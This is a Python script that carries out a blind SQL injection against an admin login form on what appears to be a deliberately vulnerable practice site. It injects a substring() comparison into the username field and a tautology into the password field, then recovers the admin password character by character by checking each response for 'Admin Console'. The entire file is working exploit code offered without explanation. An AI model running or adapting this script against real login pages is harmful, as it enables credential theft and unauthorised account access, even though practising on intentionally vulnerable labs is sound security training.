import requests
from string import ascii_letters


def username(len, string):
    return "admin' and substring(password, 1, " + str(len) + ") = '" + string + "' and ('1'='1"


def data(payload):
    return {
        'username': payload,
        'password': "' or '1'='1') and '1'='1"
    }


URL = "https://54-193-75-43-bank.vulnerablesites.net/ShadowBank/adminLogin.action"


chars = ascii_letters + '0123456789'
curPass = "zupf"
run = True

while run:
    run = False
    for letter in chars:
        print(curPass, letter)
        newPass = curPass + str(letter)
        curLen = len(newPass)
        curData = data(username(curLen, newPass))
        req = requests.post(url=URL, data=curData)
        if "Admin Console" in req.text:
            curPass = newPass
            print(curPass)
            run = True
            break
